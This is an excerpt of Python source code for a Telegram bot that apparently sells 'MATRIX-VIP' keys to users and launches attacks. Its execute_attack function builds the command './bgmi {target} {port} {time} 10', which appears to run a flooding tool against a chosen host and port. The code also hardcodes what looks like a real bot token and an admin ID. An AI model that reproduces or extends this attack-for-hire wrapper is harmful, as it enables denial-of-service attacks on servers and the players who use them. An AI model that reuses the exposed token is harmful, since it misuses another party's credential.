...
# --- Configuration ---
bot = telebot.TeleBot('7252746907:AAGkWBL1YkjwKX_ceXzNW-xxVuPLuRoEME0')

# Admin user IDs
admin_id = {"2085082046"}  # Replace with actual admin ID
...
def generate_key(length=10):
    ...
    return f"MATRIX-VIP-{key.upper()}"  # Ensure key is in uppercase
...
def execute_attack(user_id, target, port, time):
    ...
    try:
        ...
        full_command = f"./bgmi {target} {port} {time} 10"  # Replace with actual attack command
